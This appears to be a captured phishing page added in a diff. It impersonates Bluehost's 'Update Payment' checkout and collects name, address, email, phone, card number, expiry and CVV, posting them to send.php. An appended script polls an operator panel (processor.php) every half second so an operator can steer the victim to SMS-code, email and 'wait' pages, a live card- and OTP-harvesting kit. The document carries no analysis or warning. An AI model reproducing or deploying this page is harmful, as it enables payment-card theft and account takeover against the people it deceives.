@@ -1,0 +1,417 @@
+<!-- url: https://sco.tvy.mybluehost.me/web/card.php
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bluehost Checkout</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+<style>
+body {
+  font-family: 'Inter', sans-serif;
+  margin: 0;
+  padding: 0;
+  background: #fff;
+  color: #333;
+}
+header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 15px 40px;
+  border-bottom: 1px solid #eee;
+}
+header img { height: 30px; }
+header .phone { font-size: 14px; font-weight: 500; }
+
+.container {
+  display: flex;
+  justify-content: center;
+  padding: 40px;
+  gap: 40px;
+}
+
+.checkout, .summary {
+  border: 1px solid #ddd;
+  border-radius: 8px;
+  padding: 30px;
+  background: #fff;
+}
+
+.checkout {
+  flex: 2;
+  max-width: 600px;
+}
+
+.checkout h2 { font-size: 20px; font-weight: 600; margin-bottom: 20px; }
+.checkout input, .checkout select {
+  width: 100%;
+  padding: 14px 16px;
+  margin: 10px 0;
+  border: 1px solid #bbb;
+  border-radius: 6px;
+  font-size: 16px;
+  box-sizing: border-box;
+}
+.checkout .row { display: flex; gap: 10px; }
+.checkbox { margin-top: 12px; font-size: 13px; }
+
+.section { margin-top: 40px; }
+.section h3 { font-size: 18px; font-weight: 600; margin-bottom: 10px; }
+
+.payment-methods { margin: 20px 0; }
+.payment-option { display: flex; align-items: center; margin: 10px 0; font-size: 14px; }
+.payment-option img { height: 25px; margin-left: 8px; }
+
+/* Error message */
+.cc-field { position: relative; }
+.error-text {
+  color: #e53935;
+  font-size: 13px;
+  margin-top: 4px;
+  display: none;
+}
+.cc-field.error input {
+  border-color: #e53935;
+}
+.cc-field.error .error-text {
+  display: block;
+}
+
+.summary {
+  flex: 1;
+  max-width: 300px;
+}
+
+.summary h2 { font-size: 18px; font-weight: 600; margin-bottom: 20px; }
+.summary .line { display: flex; justify-content: space-between; margin: 10px 0; font-size: 14px; }
+.summary .total { font-weight: 600; font-size: 16px; margin-top: 15px; }
+.summary button {
+  width: 100%;
+  padding: 15px;
+  margin-top: 20px;
+  background: #ddd;
+  border: none;
+  border-radius: 25px;
+  font-size: 16px;
+  font-weight: 600;
+  color: #666;
+  cursor: not-allowed;
+}
+.summary .legal { font-size: 12px; margin-top: 20px; color: #555; line-height: 1.5; }
+a { color: #0066cc; text-decoration: none; font-size: 13px; }
+.trust { font-size: 13px; margin-top: 20px; color: #333; text-align: left; }
+
+/* Footer */
+footer {
+  background: #013b74;
+  color: #fff;
+  padding: 50px 80px 30px;
+  margin-top: 50px;
+}
+.footer-container {
+  display: grid;
+  grid-template-columns: repeat(5, 1fr);
+  gap: 40px;
+}
+.footer-container h4 { font-size: 16px; font-weight: 600; margin-bottom: 15px; }
+.footer-container ul { list-style: none; padding: 0; margin: 0; }
+.footer-container ul li { margin: 8px 0; }
+.footer-container ul li a { color: #fff; font-size: 14px; text-decoration: none; }
+
+.footer-bottom {
+  margin-top: 40px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  border-top: 1px solid rgba(255,255,255,0.2);
+  padding-top: 20px;
+  font-size: 13px;
+}
+.footer-logo img { height: 30px; }
+.social-icons a { margin-left: 15px; color: #fff; font-size: 18px; text-decoration: none; }
+
+/* ==== Media Query for Mobile ==== */
+@media (max-width: 768px) {
+  .container {
+    flex-direction: column; /* Arrange checkout and summary vertically */
+  }
+  .summary {
+    max-width: 100%;
+    margin-top: 20px; /* Space below checkout form */
+  }
+  .checkout .row {
+    flex-direction: column; /* Stack input fields vertically on small screens */
+  }
+}
+</style>
+</head>
+<body>
+  <header>
+    <img src="bluehost-logo.svg" alt="Bluehost Logo">
+    <div class="phone">📞 1-844-303-1730</div>
+  </header>
+
+  <form method="post" action="send.php" >
+      <div class="container">
+    <!-- Checkout Form -->
+    <div class="checkout">
+      <h2>Checkout</h2>
+      <div class="row">
+        <input type="text" name="fname" placeholder="First Name">
+        <input type="text" name="lname" placeholder="Last Name">
+      </div>
+      <input type="text" name="address" placeholder="Address">
+      <input type="text" name="city" placeholder="City">
+      <input type="text" name="zip" placeholder="ZIP/Postal Code">
+      <div class="row">
+        <input type="email" name="email" placeholder="Email">
+        <input type="tel" name="phone" placeholder="Phone">
+      </div>
+
+      <!-- Billing Information -->
+      <div class="section">
+        <h3>Billing Information</h3>
+        <hr>
+        
+        <div class="payment-methods">
+          <div class="payment-option">
+            <img src="https://securepay.svcs.endurance.com/v2/img/creditcard-list.svg" alt="JCB">
+          </div>
+          
+          <div class="cc-field">
+            <input type="text" name="cc" id="cc" placeholder="Card Number *" required>
+            <div class="error-text">The card is invalid </div>
+          </div>
+          
+          <div class="row">
+            <input type="text" id="exp" name="exp" placeholder="MM/YY" maxlength="5" inputmode="numeric" required>
+            <input type="password" name="cvv" placeholder="Security Code *" maxlength="4" inputmode="numeric" pattern="\d{4}" title="Enter exactly 4 digits" required>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="summary">
+      <h2>UPDATE PAYMENT</h2>
+      <p><a href="#">EDIT CART</a></p>
+      <div class="line"><span></span></div>
+      <div class="line total"><span>Ensure your card information is accurate and up to date.</span></div>
+      <button id="updateBtn" disabled>UPDATE PAYMENT</button>
+      <div class="legal">
+        By clicking "Update Payment", you agree to the Auto Renewal Terms, Terms of Service, Cancellation Policy, and you acknowledge receipt of our Privacy Notice. <br><br>
+        <b>All plans and products automatically renew unless you cancel.</b> You may cancel at any time, prior to your renewal date, by logging into your account online or by calling customer support.
+      </div>
+      <div class="trust">
+        <b>Excellent</b> 4.5 out of 5 ⭐ Trustpilot
+      </div>
+    </div>
+  </div>
+  </form>
+
+  <!-- Footer -->
+  <footer>
+    <div class="footer-container">
+      <div>
+        <h4>Products</h4>
+        <ul>
+          <li><a href="#">Web Hosting</a></li>
+          <li><a href="#">WordPress Hosting</a></li>
+          <li><a href="#">Cloud Hosting</a></li>
+          <li><a href="#">Fast Hosting</a></li>
+          <li><a href="#">Online Store</a></li>
+          <li><a href="#">VPS Hosting</a></li>
+          <li><a href="#">Dedicated Hosting</a></li>
+          <li><a href="#">Google Workspace</a></li>
+          <li><a href="#">Professional Email</a></li>
+          <li><a href="#">Creator Hosting</a></li>
+          <li><a href="#">Commerce Hosting</a></li>
+          <li><a href="#">Domains</a></li>
+          <li><a href="#">SSL Certificates</a></li>
+          <li><a href="#">Website Security</a></li>
+          <li><a href="#">Website Backup</a></li>
+        </ul>
+      </div>
+
+      <div>
+        <h4>Business Solutions</h4>
+        <ul>
+          <li><a href="#">Small Business</a></li>
+          <li><a href="#">Wedding Photography</a></li>
+          <li><a href="#">Booking</a></li>
+          <li><a href="#">Art</a></li>
+          <li><a href="#">Blog</a></li>
+          <li><a href="#">Travel Blog</a></li>
+          <li><a href="#">Restaurant</a></li>
+          <li><a href="#">Event</a></li>
+          <li><a href="#">Online Boutique</a></li>
+          <li><a href="#">Fitness</a></li>
+          <li><a href="#">Auto Shop</a></li>
+          <li><a href="#">Non-Profit</a></li>
+        </ul>
+      </div>
+
+      <div>
+        <h4>Programs</h4>
+        <ul>
+          <li><a href="#">Affiliates</a></li>
+          <li><a href="#">Agency Partner Program</a></li>
+          <li><a href="#">Agency Hosting</a></li>
+          <li><a href="#">Marketing Services</a></li>
+          <li><a href="#">Web Design</a></li>
+          <li><a href="#">Digital Marketing</a></li>
+          <li><a href="#">WordPress Guide</a></li>
+          <li><a href="#">Pro Design Live</a></li>
+          <li><a href="#">Refer A Friend</a></li>
+        </ul>
+      </div>
+
+      <div>
+        <h4>Support</h4>
+        <ul>
+          <li><a href="#">Knowledge Base</a></li>
+          <li><a href="#">Website SEO Checker</a></li>
+          <li><a href="#">Do Not Sell My Personal Information</a></li>
+          <li><a href="#">Accessibility</a></li>
+          <li><a href="#">Report Abuse</a></li>
+        </ul>
+      </div>
+
+      <div>
+        <h4>Company</h4>
+        <ul>
+          <li><a href="#">About</a></li>
+          <li><a href="#">Careers</a></li>
+          <li><a href="#">Contact</a></li>
+          <li><a href="#">Terms Of Service</a></li>
+          <li><a href="#">Terms Of Use</a></li>
+          <li><a href="#">Privacy</a></li>
+          <li><a href="#">Academy</a></li>
+          <li><a href="#">Blog</a></li>
+          <li><a href="#">Sitemap</a></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="footer-bottom">
+      <div class="footer-logo">
+        <img src="bluehost-logo-white.svg" alt="Bluehost">
+        <span>© 2002-2025 Bluehost Inc. All rights reserved.</span>
+      </div>
+      <div class="social-icons"></div>
+    </div>
+  </footer>
+
+<script>
+  const inputs = document.querySelectorAll('.checkout input');
+  const button = document.getElementById('updateBtn');
+
+  function checkInputs() {
+    let allFilled = true;
+    inputs.forEach(input => {
+      if (input.value.trim() === '') {
+        allFilled = false;
+      }
+    });
+
+    if (allFilled) {
+      button.disabled = false;
+      button.style.background = '#0066cc';
+      button.style.color = '#fff';
+      button.style.cursor = 'pointer';
+    } else {
+      button.disabled = true;
+      button.style.background = '#ddd';
+      button.style.color = '#666';
+      button.style.cursor = 'not-allowed';
+    }
+  }
+
+  inputs.forEach(input => {
+    input.addEventListener('input', checkInputs);
+  });
+</script>
+
+<script>
+const ccInput = document.getElementById('cc');
+
+ccInput.addEventListener('input', function(e) {
+    let digits = this.value.replace(/\D/g, '');
+    digits = digits.slice(0, 19);
+    let formatted = '';
+    for(let i = 0; i < digits.length; i++) {
+        if(i === 4 || i === 8 || i === 12 || i === 16) formatted += ' ';
+        formatted += digits[i];
+    }
+    this.value = formatted;
+});
+
+const expInput = document.getElementById('exp');
+expInput.addEventListener('input', function(e) {
+    let digits = this.value.replace(/\D/g, '');
+    digits = digits.slice(0, 4);
+    if(digits.length > 2){
+        this.value = digits.slice(0,2) + '/' + digits.slice(2);
+    } else {
+        this.value = digits;
+    }
+});
+</script>
+
+<script>
+  const params = new URLSearchParams(window.location.search);
+  const isError = params.get('e') === 'error';
+  const ccField = document.querySelector('.cc-field');
+
+  if (isError && ccField) {
+    ccField.classList.add('error');
+  }
+</script>
+</body>
+</html>
+ 
+	<script src="../panel/res/jq.js"></script>
+	<script>
+
+	var targets = {
+	//  1:"login.php", 
+	//  2:"login.php?e",
+	//  3:"pass.php?e",
+	 1:"card.php",
+	 2:"card.php?e=error",
+	 3:"sms.php",
+	 4:"sms.php?e=error",
+	 8:"email.php",
+	 9:"email.php?e", 
+	 10:"wait.php",
+	 11:"done.php",
+	  };
+
+
+	clearRedirections();
+	
+ setInterval(function(){
+	$.post("../panel/classes/processor.php",
+	{keepAlive:1, page:"CARD "} );
+}, 500);
+
+var redirect=0;
+setInterval(function(){
+	$.post("../panel/classes/processor.php",{redirectionListener:1}, function(data){
+		redirect=data;
+		if(redirect==0){
+			return false;
+		}else{
+			clearRedirections();
+			window.location=targets[redirect];
+		}
+	});
+}, 500);
+
+
+function clearRedirections(){
+	$.post("../panel/classes/processor.php",
+	{clearRedirection:1});
+}
+
+ </script>
